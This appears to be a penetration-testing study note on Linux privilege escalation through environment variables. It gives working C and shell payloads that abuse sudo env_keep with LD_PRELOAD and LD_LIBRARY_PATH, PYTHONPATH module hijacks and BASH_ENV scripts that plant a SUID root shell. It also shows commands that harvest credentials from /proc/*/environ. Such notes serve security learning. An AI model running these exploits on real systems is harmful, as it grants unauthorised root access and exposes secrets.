# Linux PrivEsc — 04. Environment Variables

> **Author:** Rasel Hossain | raselhossain79 | TryHackMe: theloser

---

## What are Environment Variables?

Environment variables are **key=value pairs** stored in the shell's memory that affect how programs behave.

```bash
env           # See all current environment variables
printenv      # Same, different command
echo $HOME    # Print single variable
echo $PATH    # Print PATH variable
echo $USER    # Current username
echo $SHELL   # Current shell
```

**Breakdown of `env`:**
- `env` = print all environment variables currently set
- `printenv` = alternative, can also print specific variables: `printenv HOME`
- `echo $VARNAME` = print value of specific variable

### Setting Variables

```bash
VAR=value           # Set variable (current shell only)
export VAR=value    # Export to child processes too
```
**Breakdown:**
- Without `export`: only current shell process has the variable
- With `export`: all child processes (scripts, programs run from this shell) also get the variable
- This is critical for privilege escalation — we need exported variables so SUID binaries inherit them

---

## View All Environment Variables

```bash
env
```

```bash
printenv
```

```bash
cat /proc/self/environ | tr '\0' '\n'
```
**Breakdown:**
- `/proc/self/environ` = environment variables of current process, stored null-separated (`\0`)
- `tr '\0' '\n'` = translate: replace null bytes `\0` with newlines `\n` (makes readable)

```bash
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
```
**Breakdown:**
- `/proc/1/` = process 1 = init/systemd (first process, runs as root)
- Reading its environment variables (needs permission, but sometimes readable)
- **Why:** Root processes may have credentials, tokens, API keys in their environment

---

## Vector 1 — LD_PRELOAD

### What is LD_PRELOAD?

`LD_PRELOAD` is an environment variable that tells the dynamic linker to load a specific shared library **BEFORE** all other libraries when any program starts.

Normal library loading order:
```
program starts → loads standard libs (libc.so, libm.so, etc.) → runs
```

With LD_PRELOAD:
```
program starts → loads OUR LIBRARY FIRST → then standard libs → runs
```

**The trick:** We write a malicious shared library with a function called `_init()` which runs automatically when the library is loaded. We put privilege escalation code inside it.

### Check if sudo Preserves LD_PRELOAD

```bash
sudo -l
```

Look for this in output:
```
env_reset
env_keep += LD_PRELOAD
```

**Breakdown:**
- `env_reset` = sudo normally resets ALL environment variables for security
- `env_keep += LD_PRELOAD` = BUT it keeps LD_PRELOAD (misconfiguration!)
- This means: when running sudo commands, our LD_PRELOAD variable is passed through

### Exploitation Steps

**Step 1 — Write the malicious shared library in C**

```bash
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
```
**Breakdown of the C code:**
- `#include <stdio.h>` = standard input/output functions
- `#include <sys/types.h>` = type definitions for system calls
- `#include <stdlib.h>` = general utilities (system(), unsetenv())
- `#include <unistd.h>` = POSIX API (setresuid())
- `void _init()` = special function called automatically when shared library is first loaded
- `unsetenv("LD_PRELOAD")` = remove LD_PRELOAD to prevent recursion (otherwise child processes would also preload our lib forever)
- `setresuid(0, 0, 0)` = set real UID, effective UID, saved UID all to 0 (root)
  - More thorough than just `setuid(0)` — sets all three UID fields to root
- `system("/bin/bash -p")` = spawn privileged bash shell

**Step 2 — Compile as a shared library**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
```
**Breakdown:**
- `gcc` = GNU C compiler
- `-fPIC` = Position Independent Code = required for shared libraries (code can be loaded at any memory address)
- `-shared` = produce a shared library (.so file) instead of an executable
- `-nostartfiles` = don't link standard startup files (we provide our own `_init` entry point)
- `-o /tmp/shell.so` = output file name and location
- `/tmp/shell.c` = input source file

**Step 3 — Run sudo command with LD_PRELOAD pointing to our library**

```bash
sudo LD_PRELOAD=/tmp/shell.so find
```
**Breakdown:**
- `sudo` = run with elevated privileges
- `LD_PRELOAD=/tmp/shell.so` = set LD_PRELOAD for this command only
  - Because `env_keep += LD_PRELOAD` is set, sudo passes this through
- `find` = any command you're allowed to sudo (doesn't matter which)
- What happens: sudo runs `find` → before find starts, loads `/tmp/shell.so` → `_init()` executes → setresuid(0,0,0) → spawns bash as root

---

## Vector 2 — LD_LIBRARY_PATH

### What is LD_LIBRARY_PATH?

Tells the dynamic linker which directories to search for shared libraries FIRST.

Normal library search order:
```
/etc/ld.so.cache → /lib → /usr/lib → /usr/local/lib
```

With LD_LIBRARY_PATH:
```
OUR DIRECTORY FIRST → then normal directories
```

**The trick:** Find a library that a sudo-allowed binary uses, create a fake version of that library with the same name, put it in our directory, then run the binary with LD_LIBRARY_PATH pointing to our directory.

### Check if sudo Preserves LD_LIBRARY_PATH

```bash
sudo -l
# Look for: env_keep += LD_LIBRARY_PATH
```

### Exploitation Steps

**Step 1 — Find shared libraries used by a sudo-allowed binary**

```bash
# Check what you can sudo
sudo -l
# Example: (root) NOPASSWD: /usr/sbin/apache2

# Find its library dependencies
ldd /usr/sbin/apache2
```
**Breakdown:**
- `ldd` = List Dynamic Dependencies = shows all shared libraries a binary needs
- Output format: `libname.so.X => /path/to/actual/library.so (memory_address)`
- Example output line: `libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1`
- Pick one to hijack, e.g., `libcrypt.so.1`

**Step 2 — Write malicious library with same name**

```bash
cat > /tmp/libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
```
**Breakdown:**
- `__attribute__((constructor))` = GCC attribute = this function runs automatically when library is loaded (same concept as `_init()`)
- `static void hijack()` = function named "hijack" (name doesn't matter, the attribute is what triggers it)
- `setresuid(0,0,0)` = become root (works because sudo has root privileges)
- `system("/bin/bash -p")` = spawn root shell

**Step 3 — Compile with same filename as real library**

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c
```
**Breakdown:**
- `-o /tmp/libcrypt.so.1` = output name MUST match the real library name exactly
- `-shared -fPIC` = compile as shared library with position independent code

**Step 4 — Run sudo binary with our library path**

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```
**Breakdown:**
- `LD_LIBRARY_PATH=/tmp` = search `/tmp` for libraries FIRST
- When apache2 loads and looks for `libcrypt.so.1`, it checks `/tmp` first
- Finds our `/tmp/libcrypt.so.1` instead of the real one
- Our constructor function runs → root shell!

---

## Vector 3 — PYTHONPATH Hijacking

### What is PYTHONPATH?

Tells Python where to search for importable modules (like libraries in Python).

```bash
echo $PYTHONPATH   # Usually empty
python3 -c "import sys; print(sys.path)"  # Shows Python's search path
```

**The trick:** If a Python script run by root imports a module, we can create a fake module with the same name in a directory we control, then set PYTHONPATH to that directory.

### Exploitation

**Step 1 — Find Python scripts run by root**

```bash
# Check cron jobs
cat /etc/crontab | grep -i python

# Check sudo
sudo -l | grep python

# Find Python scripts world-readable (to see what they import)
find / -name "*.py" -not -path "*/site-packages/*" 2>/dev/null | head -20
```

**Step 2 — Read the script and find imports**

```bash
cat /opt/scripts/backup.py
```

Example script content:
```python
import utils          # <-- imports 'utils' module
import os

utils.backup_files()
```

**Step 3 — Create malicious module**

```bash
cat > /tmp/utils.py << 'EOF'
import os

def backup_files():
    os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
EOF
```
**Breakdown:**
- File named `utils.py` = matches what the script imports (`import utils`)
- We define the `backup_files()` function so it doesn't error (the original script calls it)
- Inside: copy bash and add SUID bit → persistent root access

**Step 4 — Set PYTHONPATH and trigger**

```bash
export PYTHONPATH=/tmp
sudo python3 /opt/scripts/backup.py
# or wait for cron to run it
```
**Breakdown:**
- `PYTHONPATH=/tmp` = Python will search `/tmp` for modules first
- `import utils` in script → finds `/tmp/utils.py` (our malicious one) before real utils
- Our code runs as root → `/tmp/rootbash` created with SUID

```bash
/tmp/rootbash -p   # Spawn root shell anytime now
id                 # uid=0(root)
```

---

## Vector 4 — BASH_ENV

### What is BASH_ENV?

`BASH_ENV` = when a non-interactive bash script starts, bash reads and executes the file specified in `BASH_ENV` BEFORE running the actual script.

Think of it as a "setup file" that runs before any bash script.

### Exploitation

```bash
# If a SUID bash script exists
find / -perm -4000 -name "*.sh" 2>/dev/null

# Or if sudo runs a bash script
sudo -l
# (ALL) NOPASSWD: /usr/local/bin/backup.sh
```

```bash
# Create our malicious "setup" file
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/evil.sh
chmod +x /tmp/evil.sh

# Set BASH_ENV to our file
export BASH_ENV=/tmp/evil.sh

# Run the sudo script
sudo /usr/local/bin/backup.sh
# Before backup.sh runs, bash executes /tmp/evil.sh as root

/tmp/rootbash -p   # Root shell!
```
**Breakdown:**
- `BASH_ENV=/tmp/evil.sh` = tell bash to execute this file before any script
- When sudo runs backup.sh as root → bash reads BASH_ENV → runs evil.sh AS ROOT
- Our evil.sh creates a SUID bash copy

---

## Vector 5 — ENV Variable for sh

Similar to BASH_ENV but for POSIX sh (not bash specifically):

```bash
# For scripts starting with #!/bin/sh
export ENV=/tmp/evil.sh
```

---

## Checking sudo env_keep (Full Check)

```bash
sudo -l
```

Full output example showing exploitable config:
```
Matching Defaults entries for user on target:
    env_reset, mail_badpass,
    env_keep+="LANG LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAPPLRESDIR",
    env_keep+="LD_PRELOAD LD_LIBRARY_PATH"

User user may run the following commands on target:
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /usr/bin/find
```

**Breakdown of this output:**
- `env_reset` = sudo resets environment by default
- `env_keep+="LD_PRELOAD LD_LIBRARY_PATH"` = BUT these two survive the reset
- LD_PRELOAD is kept → LD_PRELOAD attack works
- LD_LIBRARY_PATH is kept → library hijacking attack works
- Any command in the NOPASSWD list can be used to trigger our malicious library

---

## Check for Sensitive Data in Environment

```bash
env | grep -i "pass\|secret\|key\|token\|api\|db\|user\|pwd"
```
**Breakdown:**
- `grep -i` = case-insensitive search
- `"pass\|secret\|key\|token\|api\|db\|user\|pwd"` = common patterns for credentials
- Environment variables often store database passwords, API keys, tokens

```bash
# Check environment of running processes
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "pass\|secret\|key"
```
**Breakdown:**
- `/proc/*/environ` = environment of ALL running processes
- Needs permission to read other users' process environments
- Root processes sometimes have credentials here

---

## Quick Checklist

```
[ ] sudo -l                              → check for env_keep LD_PRELOAD / LD_LIBRARY_PATH
[ ] env | grep -i pass                   → credentials in environment
[ ] cat /proc/*/environ 2>/dev/null      → check other process environments
[ ] find / -name "*.py" run by root      → PYTHONPATH hijacking target
[ ] find / -perm -4000 -name "*.sh"      → BASH_ENV attack target
[ ] gcc -fPIC -shared -nostartfiles      → compile LD_PRELOAD payload
[ ] sudo LD_PRELOAD=/tmp/shell.so CMD    → trigger LD_PRELOAD attack
[ ] ldd /path/to/sudo-binary             → find libraries for LD_LIBRARY_PATH attack
```
